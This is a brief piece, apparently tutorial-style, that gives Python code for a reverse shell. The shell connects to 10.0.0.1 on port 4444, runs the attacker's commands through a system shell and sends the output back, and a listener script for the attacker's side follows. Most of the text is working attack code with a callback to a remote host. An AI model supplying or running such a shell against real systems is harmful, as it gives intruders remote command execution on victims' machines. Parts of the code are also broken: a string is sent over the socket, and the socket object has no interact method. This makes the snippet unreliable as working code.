import socket,subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))

while True:
    command=s.recv(1024)
    output=subprocess.check_output(command,shell=True,stdin=False,stderr=False,universal_newlines=True)
    s.send(output)
This creates a socket that connects to the IP address 10.0.0.1 on port 4444. It then listens for a command from the attacker, executes it using the subprocess module, and sends the output back to the attacker.
To start a listener on the attacker's machine, you can use the following Python code:
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("10.0.0.1",4444))
s.listen(5)

while True:
    c,addr=s.accept()
    print("Connected with"+str(addr))
    c.interact()
